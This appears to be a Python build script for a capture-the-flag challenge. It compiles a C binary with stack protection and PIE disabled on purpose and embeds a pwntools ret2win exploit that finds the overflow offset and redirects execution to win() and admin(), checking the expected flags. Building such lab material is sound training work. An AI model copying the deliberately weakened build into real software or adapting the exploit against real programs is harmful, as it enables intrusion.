#!/usr/bin/env python3
"""
RET2WIN DECOY - build script.

Inside the ctfbuild container:
  1. compile src/challenge.c -> dist/challenge (no canary, no PIE)
  2. copy the container's libc.so.6 + ld into dist/ (ship them)
  3. run a pwntools exploit that proves win() (bait) and admin() (earned-fake)
     are reachable via the overflow, and that a clean run prints the egg.
"""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
WIN_PATH = HERE.replace("/c/", "C:\\").replace("/", "\\")

SCRIPT = r'''
set -e
cd /work
mkdir -p dist
gcc -fno-stack-protector -no-pie -O0 -o dist/challenge src/challenge.c
chmod 755 dist/challenge
cp "$(gcc -print-file-name=libc.so.6)" dist/libc.so.6 2>/dev/null || \
  cp /lib/x86_64-linux-gnu/libc.so.6 dist/libc.so.6
cp /lib64/ld-linux-x86-64.so.2 dist/ld-linux-x86-64.so.2
echo "=== file ==="
file dist/challenge
echo "=== exploit test ==="
export TERM=xterm PWNLIB_NOTERM=1
python3 - <<'PY'
from pwn import *
context.update(arch="amd64", log_level="error")
e = ELF("/work/dist/challenge", checksec=False)

rop = ROP(e)
ret = rop.find_gadget(["ret"])[0]

def fire(target, off):
    p = e.process()
    p.recvuntil(b"occupant:")
    p.sendline(flat({off: [ret, e.sym[target]]}))
    data = p.recvall(timeout=3)
    p.close()
    return data

# discover the saved-return offset by trying the usual candidates
off = None
for cand in (72, 64, 80, 88, 56):
    if b"DOOM{r3t2w1n" in fire("win", cand):
        off = cand
        break
assert off is not None, "could not find overflow offset"
print("offset =", off)

bait = fire("win", off)
print("win() ->", bait.strip().decode(errors="replace"))
assert b"DOOM{r3t2w1n_t00_0bv10us}" in bait, "win path failed"

ef = fire("admin", off)
print("admin() ->", ef.strip().decode(errors="replace"))
assert b"DOOM{s3cr3t_4dm1n_pwn3d}" in ef, "admin path failed"

# clean run (no overflow) -> egg
p = e.process()
p.recvuntil(b"occupant:")
p.sendline(b"hello")
egg = p.recvall(timeout=3)
p.close()
print("clean ->", egg.strip().decode(errors="replace"))
assert b"empty room" in egg, "egg path failed"
print("ALL PWN PATHS OK")
PY
'''


def main():
    env = dict(os.environ, MSYS_NO_PATHCONV="1")
    r = subprocess.run(
        ["docker", "run", "--rm", "--ulimit", "core=-1",
         "-v", f"{WIN_PATH}:/work", "ctfbuild", "bash", "-c", SCRIPT],
        capture_output=True, text=True, env=env,
    )
    print(r.stdout)
    if r.returncode != 0 or "ALL PWN PATHS OK" not in r.stdout:
        print(r.stderr, file=sys.stderr)
        sys.exit("build/exploit test failed")
    print("[07 RET2WIN DECOY] build OK")


if __name__ == "__main__":
    main()
